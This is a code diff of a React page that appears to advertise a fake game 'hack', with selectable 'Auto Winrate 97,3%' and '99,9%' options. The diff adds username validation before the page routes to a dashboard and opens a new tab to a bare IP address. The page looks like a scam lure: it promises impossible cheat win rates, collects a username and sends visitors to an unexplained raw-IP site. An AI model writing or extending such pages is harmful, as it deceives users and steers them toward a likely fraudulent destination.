@@ -31,8 +31,14 @@ function Home() {
   };
 
   function handleClick() {
-    history.push("/dashboard");
+    var inputValue = document.getElementById("input").value;
+    if(inputValue.length <= 5) {
+      alert("input username longer")
+    }
+    if(inputValue.length > 5) {
+      history.push("/dashboard");
     openInNewTab("https://172.105.212.229");
+    }
   }
   return (
     <>
@@ -55,7 +61,7 @@ function Home() {
             </Title>
 
             <div className="hack__login">
-              <Input placeholder="Username" />
+              <Input placeholder="*Username" id="input"/>
               <br />
               <button
                 type=""
@@ -123,17 +129,15 @@ function Home() {
             <Space direction="vertical">
               <Select
                 defaultValue="Auto Winrate 97,3%"
-                style={{ width: 300 }}
+                style={{ width: 250 }}
                 onChange={handleWinrate}
               >
-                {/* <Option value="68.9">Auto Winrate 68,9%</Option>
-                  <Option value="86.9">Auto Winrate 86,9%</Option> */}
                 <Option value="97.3">Auto Winrate 97,3%</Option>
                 <Option value="99.9">Auto Winrate 99,9%</Option>
               </Select>
               <Select
                 defaultValue="Auto Spin"
-                style={{ width: 300 }}
+                style={{ width: 250 }}
                 onChange=""
               >
                 <Option value="Auto Spin">Auto Spin</Option>
@@ -145,17 +149,6 @@ function Home() {
               </Select>
             </Space>
           </div>
-          {/* <Col className="gutter-row" span={6}>
-            <div className="main__info__items__mid">
-              <Title level={2}>Hack Now!</Title>
-              <Space direction="vertical">
-                <Input placeholder="Username" />
-                <Button type="primary" block danger onClick={handleClick}>
-                  Hacked
-                </Button>
-              </Space>
-            </div>
-          </Col> */}
         </div>
       </div>
     </>
